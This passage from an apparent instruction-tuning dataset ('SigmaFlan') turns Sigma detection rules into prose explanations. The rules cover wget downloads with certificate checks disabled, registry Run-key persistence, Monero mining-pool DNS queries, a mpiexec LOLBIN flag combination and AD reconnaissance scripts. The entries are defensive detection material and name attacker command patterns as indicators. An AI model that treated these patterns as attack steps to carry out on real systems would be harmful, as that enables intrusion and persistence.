    "context": "",
    "output": "In order to detect execution of \"wget\" to download a \"tar\" from an IP address that doesn't have a trusted certificate, as seen used by UNC4841 during their Barracuda ESG zero-day exploitation, you should: \n\nMonitor Linux systems for the creation of processes involving the \"wget\" utility. Specifically, look for instances where \"wget\" is used to download files with a \".tar\" extension from IP addresses, indicated by a pattern that matches an IP format (e.g., 'https://192.168.0.1'). This attempt should raise suspicions especially when the command line includes the '--no-check-certificate' option, which is a workaround for SSL certificate verification. This scenario might indicate a security concern or a potential malicious activity similar to the tactics used by certain threat groups.\n\nAdditionally, to refine the detection and reduce noise from legitimate operations within an internal network, any downloads from common local IP ranges (such as 10.x.x.x, 172.16.x.x to 172.31.x.x, 192.168.x.x, 127.x.x.x, and 169.254.x.x) should be excluded from alerts unless otherwise desired. This approach focuses the detection on external and possibly malicious sources, aligning with observed attack patterns. \n\nThis monitoring strategy is crucial for identifying possibly malicious downloads via \"wget\" that could bypass SSL/TLS certificate validation, a method associated with specific cyber threat activities.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "execution of \"wget\" to download a \"tar\" from an IP address that doesn't have a trusted certificate. As seen used by UNC4841 during their Barracuda ESG zero day exploitation.",
      "answer": "In order to detect execution of \"wget\" to download a \"tar\" from an IP address that doesn't have a trusted certificate, as seen used by UNC4841 during their Barracuda ESG zero-day exploitation, you should: \n\nMonitor Linux systems for the creation of processes involving the \"wget\" utility. Specifically, look for instances where \"wget\" is used to download files with a \".tar\" extension from IP addresses, indicated by a pattern that matches an IP format (e.g., 'https://192.168.0.1'). This attempt should raise suspicions especially when the command line includes the '--no-check-certificate' option, which is a workaround for SSL certificate verification. This scenario might indicate a security concern or a potential malicious activity similar to the tactics used by certain threat groups.\n\nAdditionally, to refine the detection and reduce noise from legitimate operations within an internal network, any downloads from common local IP ranges (such as 10.x.x.x, 172.16.x.x to 172.31.x.x, 192.168.x.x, 127.x.x.x, and 169.254.x.x) should be excluded from alerts unless otherwise desired. This approach focuses the detection on external and possibly malicious sources, aligning with observed attack patterns. \n\nThis monitoring strategy is crucial for identifying possibly malicious downloads via \"wget\" that could bypass SSL/TLS certificate validation, a method associated with specific cyber threat activities."
    }
  },
  {
    "instruction": "Please help me detect the following: Windows Installer service (msiexec.exe) trying to install MSI packages with SYSTEM privilege",
    "context": "",
    "output": "Sure!\nIn order to detect Windows Installer service (msiexec.exe) trying to install MSI packages with SYSTEM privilege, you should monitor Windows process creation logs for certain conditions indicating a potentially unauthorized or malicious MSI installation attempt. Specifically, observe for processes initiated by users containing 'AUTHORI' or 'AUTORI' in their names, reflecting variations in language settings that may indicate the use of privileged account names. Look for processes where the image path includes '\\Windows\\Installer\\' and ends with 'tmp', or where the image path specifically ends with '\\msiexec.exe' running at 'System' integrity level, signaling the execution of the Windows Installer service in a manner that might suggest elevation of privilege.\n\nExclude detections where the parent image initiating the process is 'C:\\Windows\\System32\\services.exe', as this may indicate a legitimate system activity. Also, disregard instances where the command line ends with '\\system32\\msiexec.exe /V', or the parent command line ends similarly, as this might denote a repair option being used, which is generally considered safe. Additionally, process creations originating from directories associated with known antivirus products like Sophos, Avira, Avast, and Google Update processes should also be excluded to minimize false positives.\n\nBe mindful of legitimate system administrator activities or antimalware software operations, as these might produce similar logs but are considered benign. Moreover, any process creations stemming from the \"C:\\Program Files\\WindowsApps\\\" directory should be treated cautiously as they might be false alarms.\n\nBy applying these criteria, activities that raise security concerns can be isolated, helping to protect the system from unauthorized access or modification.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Windows Installer service (msiexec.exe) trying to install MSI packages with SYSTEM privilege",
      "answer": "In order to detect Windows Installer service (msiexec.exe) trying to install MSI packages with SYSTEM privilege, you should monitor Windows process creation logs for certain conditions indicating a potentially unauthorized or malicious MSI installation attempt. Specifically, observe for processes initiated by users containing 'AUTHORI' or 'AUTORI' in their names, reflecting variations in language settings that may indicate the use of privileged account names. Look for processes where the image path includes '\\Windows\\Installer\\' and ends with 'tmp', or where the image path specifically ends with '\\msiexec.exe' running at 'System' integrity level, signaling the execution of the Windows Installer service in a manner that might suggest elevation of privilege.\n\nExclude detections where the parent image initiating the process is 'C:\\Windows\\System32\\services.exe', as this may indicate a legitimate system activity. Also, disregard instances where the command line ends with '\\system32\\msiexec.exe /V', or the parent command line ends similarly, as this might denote a repair option being used, which is generally considered safe. Additionally, process creations originating from directories associated with known antivirus products like Sophos, Avira, Avast, and Google Update processes should also be excluded to minimize false positives.\n\nBe mindful of legitimate system administrator activities or antimalware software operations, as these might produce similar logs but are considered benign. Moreover, any process creations stemming from the \"C:\\Program Files\\WindowsApps\\\" directory should be treated cautiously as they might be false alarms.\n\nBy applying these criteria, activities that raise security concerns can be isolated, helping to protect the system from unauthorized access or modification."
    }
  },
  {
    "instruction": "Explain how should I detect the following: specific command line execution used by Mustang Panda in a targeted attack against the Australian government as reported by Lab52",
    "context": "",
    "output": "In order to Detects specific command line execution used by Mustang Panda in a targeted attack against the Australian government as reported by Lab52, you should: Monitor Windows process creation logs for the execution of commands that might indicate an attack. Specifically, look for two sets of command line activities. The first set should involve the use of the 'copy' command to duplicate the file 'SolidPDFCreator.dll' into the directory 'C:\\Users\\Public\\Libraries\\PhotoTvRHD\\'. The second set of activities to watch for includes the usage of 'reg' command to make registry modifications, specifically adding entries under '\\Windows\\CurrentVersion\\Run' that reference 'SolidPDF' and are located in the directory 'C:\\Users\\Public\\Libraries\\PhotoTvRHD\\'. This behavior is indicative of an attempt to maintain persistence on the compromised system by ensuring the malicious DLL is loaded at system startup. The detection of either of these activities is considered highly suspicious and unlikely to be a false positive, signifying a potential compromise by the Mustang Panda group.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "specific command line execution used by Mustang Panda in a targeted attack against the Australian government as reported by Lab52",
      "answer": "In order to Detects specific command line execution used by Mustang Panda in a targeted attack against the Australian government as reported by Lab52, you should: Monitor Windows process creation logs for the execution of commands that might indicate an attack. Specifically, look for two sets of command line activities. The first set should involve the use of the 'copy' command to duplicate the file 'SolidPDFCreator.dll' into the directory 'C:\\Users\\Public\\Libraries\\PhotoTvRHD\\'. The second set of activities to watch for includes the usage of 'reg' command to make registry modifications, specifically adding entries under '\\Windows\\CurrentVersion\\Run' that reference 'SolidPDF' and are located in the directory 'C:\\Users\\Public\\Libraries\\PhotoTvRHD\\'. This behavior is indicative of an attempt to maintain persistence on the compromised system by ensuring the malicious DLL is loaded at system startup. The detection of either of these activities is considered highly suspicious and unlikely to be a false positive, signifying a potential compromise by the Mustang Panda group."
    }
  },
  {
    "instruction": "How can I detect: Adversaries may attempt to find local system groups and permission settings.\nThe knowledge of local system permission groups can help adversaries determine which groups exist and which users belong to a particular group.\nAdversaries may use this information to determine which users have elevated permissions, such as the users found within the local administrators group.\n",
    "context": "",
    "output": "In order to identify when adversaries may attempt to find local system groups and permission settings to understand group memberships and users with elevated permissions, you should focus on monitoring PowerShell script execution on Windows systems. Specifically, ensure that Script Block Logging is enabled to capture the execution details of PowerShell scripts. Look for the usage of commands within the PowerShell scripts such as 'get-localgroup' and 'Get-LocalGroupMember', which are typically used to enumerate local system groups. Additionally, watch for the combination of 'Get-WMIObject' and 'Win32_Group' being used together in scripts, as this may also indicate an attempt to query local system groups and memberships. This detection strategy is considered to have a low level of potential false positives, acknowledging that while these commands can be utilized for legitimate administration purposes, their execution should be contextualized within the broader scope of observed behavior on the system. Employing this detection approach will assist in identifying possible reconnaissance activities aimed at uncovering local group memberships and user permissions, contributing to the broader effort of mitigating tactics such as Discovery and Privilege Escalation.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Adversaries may attempt to find local system groups and permission settings.\nThe knowledge of local system permission groups can help adversaries determine which groups exist and which users belong to a particular group.\nAdversaries may use this information to determine which users have elevated permissions, such as the users found within the local administrators group.\n",
      "answer": "In order to identify when adversaries may attempt to find local system groups and permission settings to understand group memberships and users with elevated permissions, you should focus on monitoring PowerShell script execution on Windows systems. Specifically, ensure that Script Block Logging is enabled to capture the execution details of PowerShell scripts. Look for the usage of commands within the PowerShell scripts such as 'get-localgroup' and 'Get-LocalGroupMember', which are typically used to enumerate local system groups. Additionally, watch for the combination of 'Get-WMIObject' and 'Win32_Group' being used together in scripts, as this may also indicate an attempt to query local system groups and memberships. This detection strategy is considered to have a low level of potential false positives, acknowledging that while these commands can be utilized for legitimate administration purposes, their execution should be contextualized within the broader scope of observed behavior on the system. Employing this detection approach will assist in identifying possible reconnaissance activities aimed at uncovering local group memberships and user permissions, contributing to the broader effort of mitigating tactics such as Discovery and Privilege Escalation."
    }
  },
  {
    "instruction": "Please help me detect the following: suspicious encoded character syntax often used for defense evasion",
    "context": "",
    "output": "Sure!\nIn order to detect suspicious encoded character syntax often used for defense evasion, you should monitor the creation of processes on Windows systems. Specifically, look for processes that are started with command line arguments that contain the encoded character syntax '(WCHAR)0x'. This syntax is often used by attackers to evade detection mechanisms by encoding parts of their commands. The presence of this pattern in the command line might indicate an attempt to circumvent security controls, so it's flagged at a high level of concern. However, be aware that there could be legitimate uses of this syntax, leading to potential unknown false positives.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "suspicious encoded character syntax often used for defense evasion",
      "answer": "In order to detect suspicious encoded character syntax often used for defense evasion, you should monitor the creation of processes on Windows systems. Specifically, look for processes that are started with command line arguments that contain the encoded character syntax '(WCHAR)0x'. This syntax is often used by attackers to evade detection mechanisms by encoding parts of their commands. The presence of this pattern in the command line might indicate an attempt to circumvent security controls, so it's flagged at a high level of concern. However, be aware that there could be legitimate uses of this syntax, leading to potential unknown false positives."
    }
  },
  {
    "instruction": "How to detect: execution of different Windows based hacktools via PE metadata (company, product, etc.) even if the files have been renamed",
    "context": "",
    "output": "In order to detect the execution of different Windows based hacktools via PE metadata (company, product, etc.) even if the files have been renamed, you should: Focus on monitoring the creation of processes on Windows systems. Specifically, look for any process that has been initiated where the metadata of the process's executable file contains the company name \"Cube0x0\". This name is associated with a known hacktool producer who embeds their handle in the PE (Portable Executable) headers of all binaries they create. Some of the tools that could be detected this way include SharpPrintNightmare, KrbRelay, and SharpMapExec, among others. Given that \"Cube0x0\" is not a common name found in legitimate software company metadata, false positives are considered to be unlikely. The detection operates at a high level of criticality, indicating the serious nature of the activity if spotted.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "execution of different Windows based hacktools via PE metadata (company, product, etc.) even if the files have been renamed",
      "answer": "In order to detect the execution of different Windows based hacktools via PE metadata (company, product, etc.) even if the files have been renamed, you should: Focus on monitoring the creation of processes on Windows systems. Specifically, look for any process that has been initiated where the metadata of the process's executable file contains the company name \"Cube0x0\". This name is associated with a known hacktool producer who embeds their handle in the PE (Portable Executable) headers of all binaries they create. Some of the tools that could be detected this way include SharpPrintNightmare, KrbRelay, and SharpMapExec, among others. Given that \"Cube0x0\" is not a common name found in legitimate software company metadata, false positives are considered to be unlikely. The detection operates at a high level of criticality, indicating the serious nature of the activity if spotted."
    }
  },
  {
    "instruction": "How can I detect: creation of log files during a TeamViewer remote session",
    "context": "",
    "output": "In order to detect the creation of log files during a TeamViewer remote session, you should: focus on monitoring Windows file event logs for the creation of specific TeamViewer log files. This involves tracking instances where files ending with '\\TeamViewer\\RemotePrinting\\tvprint.db' or '\\TeamViewer\\TVNetwork.log' are created. Additionally, it's important to look for file creations containing the path '\\TeamViewer' combined with the file name component '_Logfile.log'. This approach aims to identify potentially unauthorized or malicious use of TeamViewer by spotting the creation of these distinctive log files, which could indicate a remote session. However, it's also crucial to consider the context of these detections as legitimate use of TeamViewer within an organization can lead to similar log file creations, which would be considered false positives in this security monitoring scenario. The sensitivity level for this detection is set to medium, acknowledging the balance between detecting potential threats and minimizing the impact of false-positive alerts on organizational operations.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "creation of log files during a TeamViewer remote session",
      "answer": "In order to detect the creation of log files during a TeamViewer remote session, you should: focus on monitoring Windows file event logs for the creation of specific TeamViewer log files. This involves tracking instances where files ending with '\\TeamViewer\\RemotePrinting\\tvprint.db' or '\\TeamViewer\\TVNetwork.log' are created. Additionally, it's important to look for file creations containing the path '\\TeamViewer' combined with the file name component '_Logfile.log'. This approach aims to identify potentially unauthorized or malicious use of TeamViewer by spotting the creation of these distinctive log files, which could indicate a remote session. However, it's also crucial to consider the context of these detections as legitimate use of TeamViewer within an organization can lead to similar log file creations, which would be considered false positives in this security monitoring scenario. The sensitivity level for this detection is set to medium, acknowledging the balance between detecting potential threats and minimizing the impact of false-positive alerts on organizational operations."
    }
  },
  {
    "instruction": "Can you explain how to detect: remote RPC calls to possibly abuse remote encryption service via MS-EFSR",
    "context": "",
    "output": "Certainly!\n\nIn order to detect remote RPC calls to possibly abuse remote encryption service via MS-EFSR, you should: Monitor the RPC (Remote Procedure Call) firewall logs for applications, specifically looking for Event Log labeled RPCFW with an Event ID of 3. This event indicates an RPC call has been made. Pay special attention to calls made using the Interface UUIDs df1941c5-fe89-4e79-bf10-463657acf44d or c681d488-d850-11d0-8c52-00c04fd90f7e, as these are known identifiers for operations that could be related to the abuse of the Microsoft Encrypting File System Remote (MS-EFSR) service. However, it is important to consider that there may be legitimate usage of remote file encryption services; such activities should not automatically be treated as malicious without further investigation. Since this activity is considered to be of high importance, ensure that the RPC firewall is correctly installed and applied to all relevant processes as a preventative measure against potential abuse.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "remote RPC calls to possibly abuse remote encryption service via MS-EFSR",
      "answer": "In order to detect remote RPC calls to possibly abuse remote encryption service via MS-EFSR, you should: Monitor the RPC (Remote Procedure Call) firewall logs for applications, specifically looking for Event Log labeled RPCFW with an Event ID of 3. This event indicates an RPC call has been made. Pay special attention to calls made using the Interface UUIDs df1941c5-fe89-4e79-bf10-463657acf44d or c681d488-d850-11d0-8c52-00c04fd90f7e, as these are known identifiers for operations that could be related to the abuse of the Microsoft Encrypting File System Remote (MS-EFSR) service. However, it is important to consider that there may be legitimate usage of remote file encryption services; such activities should not automatically be treated as malicious without further investigation. Since this activity is considered to be of high importance, ensure that the RPC firewall is correctly installed and applied to all relevant processes as a preventative measure against potential abuse."
    }
  },
  {
    "instruction": "Can you explain how to detect: suspicious execution of 'Msbuild.exe' by a uncommon parent process",
    "context": "",
    "output": "Certainly!\n\nIn order to detect suspicious execution of 'Msbuild.exe' by an uncommon parent process, you should monitor process creation events in Windows. Look for instances where 'MSBuild.exe' is the process being initiated, either by checking if the image path ends with '\\MSBuild.exe' or if the original file name is 'MSBuild.exe'. It is crucial to exclude cases where the parent process (the process initiating MSBuild.exe) is a common developer or system process. These include 'devenv.exe' (Visual Studio), 'cmd.exe' (Command Prompt), 'msbuild.exe' (MSBuild itself), 'python.exe', 'explorer.exe' (Windows Explorer), and 'nuget.exe'. The focus is on capturing executions of MSBuild.exe that do not originate from these standard or expected parent processes, as this could indicate malicious activity. The alert level for this rule is set to medium, given the potential for false positives, which means there might be legitimate scenarios that trigger this detection that are not necessarily security threats.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "suspicious execution of 'Msbuild.exe' by a uncommon parent process",
      "answer": "In order to detect suspicious execution of 'Msbuild.exe' by an uncommon parent process, you should monitor process creation events in Windows. Look for instances where 'MSBuild.exe' is the process being initiated, either by checking if the image path ends with '\\MSBuild.exe' or if the original file name is 'MSBuild.exe'. It is crucial to exclude cases where the parent process (the process initiating MSBuild.exe) is a common developer or system process. These include 'devenv.exe' (Visual Studio), 'cmd.exe' (Command Prompt), 'msbuild.exe' (MSBuild itself), 'python.exe', 'explorer.exe' (Windows Explorer), and 'nuget.exe'. The focus is on capturing executions of MSBuild.exe that do not originate from these standard or expected parent processes, as this could indicate malicious activity. The alert level for this rule is set to medium, given the potential for false positives, which means there might be legitimate scenarios that trigger this detection that are not necessarily security threats."
    }
  },
  {
    "instruction": "Please help me detect the following: user log-off activity. Could be used for example to correlate information during forensic investigations",
    "context": "",
    "output": "Sure!\nIn order to detect a user log-off activity, which could be used for example to correlate information during forensic investigations, you should monitor Windows security logs for events with the Event IDs 4634 or 4647. These IDs are indicative of user log-off activities. This monitoring process is vital for gathering data that could be important during forensic investigations, where understanding when a user has logged off could provide crucial context or indicate suspicious behavior following certain actions within a system. It's important to note that while this detection strategy is aimed at capturing log-off events, the nature of what constitutes a false positive in this context is not specified, suggesting that any unexpected findings should be closely analyzed. The severity of findings based on these Event IDs is considered informational, highlighting their role more in investigative or audit scenarios rather than immediate security alerts.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "user log-off activity. Could be used for example to correlate information during forensic investigations",
      "answer": "In order to detect a user log-off activity, which could be used for example to correlate information during forensic investigations, you should monitor Windows security logs for events with the Event IDs 4634 or 4647. These IDs are indicative of user log-off activities. This monitoring process is vital for gathering data that could be important during forensic investigations, where understanding when a user has logged off could provide crucial context or indicate suspicious behavior following certain actions within a system. It's important to note that while this detection strategy is aimed at capturing log-off events, the nature of what constitutes a false positive in this context is not specified, suggesting that any unexpected findings should be closely analyzed. The severity of findings based on these Event IDs is considered informational, highlighting their role more in investigative or audit scenarios rather than immediate security alerts."
    }
  },
  {
    "instruction": "Can you explain how to detect: suspicious DNS queries to Monero mining pools",
    "context": "",
    "output": "Certainly!\n\nIn order to detect suspicious DNS queries to Monero mining pools, you should monitor DNS query logs for signs of communication with known Monero mining pool domains. Look specifically for queries that contain the following domains: 'pool.minexmr.com', 'fr.minexmr.com', 'de.minexmr.com', 'sg.minexmr.com', 'ca.minexmr.com', 'us-west.minexmr.com', 'pool.supportxmr.com', 'mine.c3pool.com', 'xmr-eu1.nanopool.org', 'xmr-eu2.nanopool.org', 'xmr-us-east1.nanopool.org', 'xmr-us-west1.nanopool.org', 'xmr-asia1.nanopool.org', 'xmr-jp1.nanopool.org', 'xmr-au1.nanopool.org', 'xmr.2miners.com', 'xmr.hashcity.org', 'xmr.f2pool.com', 'xmrpool.eu', and 'pool.hashvault.pro'. Such DNS requests could be indicative of a device within the network being compromised and utilized for mining cryptocurrencies, specifically Monero, without the user's consent. While monitoring, bear in mind that legitimate cryptocurrency mining activities may also generate similar DNS queries, so it's essential to differentiate between benign and malicious intent through investigation of flagged events. The identification of this type of activity is crucial due to its high impact potential, suggesting immediate and thorough investigation upon detection.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "suspicious DNS queries to Monero mining pools",
      "answer": "In order to detect suspicious DNS queries to Monero mining pools, you should monitor DNS query logs for signs of communication with known Monero mining pool domains. Look specifically for queries that contain the following domains: 'pool.minexmr.com', 'fr.minexmr.com', 'de.minexmr.com', 'sg.minexmr.com', 'ca.minexmr.com', 'us-west.minexmr.com', 'pool.supportxmr.com', 'mine.c3pool.com', 'xmr-eu1.nanopool.org', 'xmr-eu2.nanopool.org', 'xmr-us-east1.nanopool.org', 'xmr-us-west1.nanopool.org', 'xmr-asia1.nanopool.org', 'xmr-jp1.nanopool.org', 'xmr-au1.nanopool.org', 'xmr.2miners.com', 'xmr.hashcity.org', 'xmr.f2pool.com', 'xmrpool.eu', and 'pool.hashvault.pro'. Such DNS requests could be indicative of a device within the network being compromised and utilized for mining cryptocurrencies, specifically Monero, without the user's consent. While monitoring, bear in mind that legitimate cryptocurrency mining activities may also generate similar DNS queries, so it's essential to differentiate between benign and malicious intent through investigation of flagged events. The identification of this type of activity is crucial due to its high impact potential, suggesting immediate and thorough investigation upon detection."
    }
  },
  {
    "instruction": "How to detect: potential DLL sideloading using JUSTSYSTEMS Japanese word processor",
    "context": "",
    "output": "In order to detect potential DLL sideloading using JUSTSYSTEMS Japanese word processor, you should: Focus on monitoring the loading of DLL files in Windows environments, specifically looking for any instances where a DLL named '\\JSESPR.dll' is loaded, but not from the expected location of 'C:\\Program Files\\Common Files\\Justsystem\\JsSchHlp\\'. This detection is crucial as it highlights an unusual load path that could indicate malicious activity, such as attempts to piggyback on legitimate processes of the JustSystems word processor to execute harmful code. Therefore, any event where '\\JSESPR.dll' is loaded outside of the specified directory should be considered suspicious and warrants further investigation. The importance of this detection is rated as medium, implying that while such occurrences might not always represent security threats, they are unusual enough to require attention.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "potential DLL sideloading using JUSTSYSTEMS Japanese word processor",
      "answer": "In order to detect potential DLL sideloading using JUSTSYSTEMS Japanese word processor, you should: Focus on monitoring the loading of DLL files in Windows environments, specifically looking for any instances where a DLL named '\\JSESPR.dll' is loaded, but not from the expected location of 'C:\\Program Files\\Common Files\\Justsystem\\JsSchHlp\\'. This detection is crucial as it highlights an unusual load path that could indicate malicious activity, such as attempts to piggyback on legitimate processes of the JustSystems word processor to execute harmful code. Therefore, any event where '\\JSESPR.dll' is loaded outside of the specified directory should be considered suspicious and warrants further investigation. The importance of this detection is rated as medium, implying that while such occurrences might not always represent security threats, they are unusual enough to require attention."
    }
  },
  {
    "instruction": "How can I detect: This detection uses Windows security events to detect suspicious access attempts to the registry key values and sub-keys of Azure AD Health service agents (e.g AD FS).\nInformation from AD Health service agents can be used to potentially abuse some of the features provided by those services in the cloud (e.g. Federation).\nThis detection requires an access control entry (ACE) on the system access control list (SACL) of the following securable object: HKLM:\\SOFTWARE\\Microsoft\\ADHealthAgent.\nMake sure you set the SACL to propagate to its sub-keys.\n",
    "context": "",
    "output": "In order to detect suspicious access attempts to the registry key values and sub-keys of Azure AD Health service agents (e.g., AD FS), which information from can be used to potentially abuse some of the features provided by those services in the cloud (e.g., Federation), you should: Monitor Windows security logs for events with IDs 4656 and 4663 that indicate an attempt to access the registry key '\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\ADHealthAgent'. It's crucial to pay attention to these events because they represent attempts to interact with the registry keys associated with the Azure AD Health service agents. However, you should disregard events generated by the known legitimate processes of the AD Health services such as 'Microsoft.Identity.Health.Adfs.DiagnosticsAgent.exe', 'Microsoft.Identity.Health.Adfs.InsightsService.exe', 'Microsoft.Identity.Health.Adfs.MonitoringAgent.Startup.exe', 'Microsoft.Identity.Health.Adfs.PshSurrogate.exe', and 'Microsoft.Identity.Health.Common.Clients.ResourceMonitor.exe'. This detection mechanism leans on filtering out known legitimate access attempts by these specific processes, focusing on identifying potentially unauthorized or malicious attempts to access these keys. To ensure these detections are accurate, you need to have configured an access control entry (ACE) on the system access control list (SACL) for the securable object (in this case, the registry key HKLM:\\SOFTWARE\\Microsoft\\ADHealthAgent) and set the SACL to also apply to its sub-keys. This method helps in monitoring and alerting on potential abuses or intrusion attempts related to Federation features and other cloud services tied to the Azure AD Health service.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "This detection uses Windows security events to detect suspicious access attempts to the registry key values and sub-keys of Azure AD Health service agents (e.g AD FS).\nInformation from AD Health service agents can be used to potentially abuse some of the features provided by those services in the cloud (e.g. Federation).\nThis detection requires an access control entry (ACE) on the system access control list (SACL) of the following securable object: HKLM:\\SOFTWARE\\Microsoft\\ADHealthAgent.\nMake sure you set the SACL to propagate to its sub-keys.\n",
      "answer": "In order to detect suspicious access attempts to the registry key values and sub-keys of Azure AD Health service agents (e.g., AD FS), which information from can be used to potentially abuse some of the features provided by those services in the cloud (e.g., Federation), you should: Monitor Windows security logs for events with IDs 4656 and 4663 that indicate an attempt to access the registry key '\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\ADHealthAgent'. It's crucial to pay attention to these events because they represent attempts to interact with the registry keys associated with the Azure AD Health service agents. However, you should disregard events generated by the known legitimate processes of the AD Health services such as 'Microsoft.Identity.Health.Adfs.DiagnosticsAgent.exe', 'Microsoft.Identity.Health.Adfs.InsightsService.exe', 'Microsoft.Identity.Health.Adfs.MonitoringAgent.Startup.exe', 'Microsoft.Identity.Health.Adfs.PshSurrogate.exe', and 'Microsoft.Identity.Health.Common.Clients.ResourceMonitor.exe'. This detection mechanism leans on filtering out known legitimate access attempts by these specific processes, focusing on identifying potentially unauthorized or malicious attempts to access these keys. To ensure these detections are accurate, you need to have configured an access control entry (ACE) on the system access control list (SACL) for the securable object (in this case, the registry key HKLM:\\SOFTWARE\\Microsoft\\ADHealthAgent) and set the SACL to also apply to its sub-keys. This method helps in monitoring and alerting on potential abuses or intrusion attempts related to Federation features and other cloud services tied to the Azure AD Health service."
    }
  },
  {
    "instruction": "How can I detect: suspicious command line arguments of common data compression tools",
    "context": "",
    "output": "In order to detect suspicious command line arguments of common data compression tools, you should focus on monitoring process creation logs on Windows systems. Look for processes starting with the original file names that include patterns like '7z*.exe', '*rar.exe', or '*Command*Line*RAR*'. Additionally, pay attention to the command line arguments containing specific flags such as ' -p', ' -ta', ' -tb', ' -sdel', ' -dw', or ' -hp'. These flags could indicate an attempt to manipulate archives in a suspicious manner, possibly to hide, encrypt, or delete information. However, it's crucial to avoid false positives by excluding any activity where the parent image path starts with 'C:\\Program'. By implementing this detection logic, one can significantly improve the identification of potentially malicious use of compression tools, which is often associated with tactics and techniques including exfiltration, evasion, and command and control. The rule is set to a high level of importance due to the potential severity of these activities.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "suspicious command line arguments of common data compression tools",
      "answer": "In order to detect suspicious command line arguments of common data compression tools, you should focus on monitoring process creation logs on Windows systems. Look for processes starting with the original file names that include patterns like '7z*.exe', '*rar.exe', or '*Command*Line*RAR*'. Additionally, pay attention to the command line arguments containing specific flags such as ' -p', ' -ta', ' -tb', ' -sdel', ' -dw', or ' -hp'. These flags could indicate an attempt to manipulate archives in a suspicious manner, possibly to hide, encrypt, or delete information. However, it's crucial to avoid false positives by excluding any activity where the parent image path starts with 'C:\\Program'. By implementing this detection logic, one can significantly improve the identification of potentially malicious use of compression tools, which is often associated with tactics and techniques including exfiltration, evasion, and command and control. The rule is set to a high level of importance due to the potential severity of these activities."
    }
  },
  {
    "instruction": "How to detect: certain command line flag combination used by mpiexec.exe LOLBIN from HPC pack that can be used to execute any other binary",
    "context": "",
    "output": "In order to detect a certain command line flag combination used by mpiexec.exe LOLBIN from HPC Pack that can be used to execute any other binary, you should focus on monitoring process creation events within Windows environments. Specifically, pay attention to instances where the mpiexec.exe file is being executed, which can be identified either through the file's name ending with '\\mpiexec.exe', its Image Hash (Imphash) being 'd8b52ef6aaa3a81501bdfff9dbb96217', or any hashes containing the specific Imphash value 'd8b52ef6aaa3a81501bdfff9dbb96217'. Additionally, it's critical to watch for the execution of mpiexec.exe with specific command line flags (' /n 1 ' or ' -n 1 '), as these flags are indicative of an attempt to misuse the LOLBIN for potentially malicious purposes. Given the high-risk nature of these indicators, all detected conditions should be met before generating an alert to avoid false positives, although unknown false positives have been acknowledged.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "certain command line flag combination used by mpiexec.exe LOLBIN from HPC pack that can be used to execute any other binary",
      "answer": "In order to detect a certain command line flag combination used by mpiexec.exe LOLBIN from HPC Pack that can be used to execute any other binary, you should focus on monitoring process creation events within Windows environments. Specifically, pay attention to instances where the mpiexec.exe file is being executed, which can be identified either through the file's name ending with '\\mpiexec.exe', its Image Hash (Imphash) being 'd8b52ef6aaa3a81501bdfff9dbb96217', or any hashes containing the specific Imphash value 'd8b52ef6aaa3a81501bdfff9dbb96217'. Additionally, it's critical to watch for the execution of mpiexec.exe with specific command line flags (' /n 1 ' or ' -n 1 '), as these flags are indicative of an attempt to misuse the LOLBIN for potentially malicious purposes. Given the high-risk nature of these indicators, all detected conditions should be met before generating an alert to avoid false positives, although unknown false positives have been acknowledged."
    }
  },
  {
    "instruction": "Explain how should I detect the following: execution of ADRecon.ps1 for AD reconnaissance which has been reported to be actively used by FIN7",
    "context": "",
    "output": "In order to detect execution of ADRecon.ps1 for AD reconnaissance which has been reported to be actively used by FIN7, you should: focus on monitoring Windows PowerShell script activities, specifically through Script Block Logging. This requires Script Block Logging to be enabled to capture the necessary data. Look for any instances where the script text includes the use of functions or files indicative of ADRecon tool usage, such as 'Function Get-ADRExcelComOb', 'Get-ADRGPO', 'Get-ADRDomainController', or references to 'ADRecon-Report.xlsx'. These elements are key indicators of the script in question being executed for Active Directory reconnaissance purposes. It's important to note that such detection holds a high level of importance due to the nature of the activities associated with the ADRecon.ps1 script and the capabilities of the actors, like FIN7, leveraging such tools.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "execution of ADRecon.ps1 for AD reconnaissance which has been reported to be actively used by FIN7",
      "answer": "In order to detect execution of ADRecon.ps1 for AD reconnaissance which has been reported to be actively used by FIN7, you should: focus on monitoring Windows PowerShell script activities, specifically through Script Block Logging. This requires Script Block Logging to be enabled to capture the necessary data. Look for any instances where the script text includes the use of functions or files indicative of ADRecon tool usage, such as 'Function Get-ADRExcelComOb', 'Get-ADRGPO', 'Get-ADRDomainController', or references to 'ADRecon-Report.xlsx'. These elements are key indicators of the script in question being executed for Active Directory reconnaissance purposes. It's important to note that such detection holds a high level of importance due to the nature of the activities associated with the ADRecon.ps1 script and the capabilities of the actors, like FIN7, leveraging such tools."
    }
  },
  {
    "instruction": "Can you explain how to detect: Potential adversaries accessing the microphone and webcam in an endpoint.",
    "context": "",
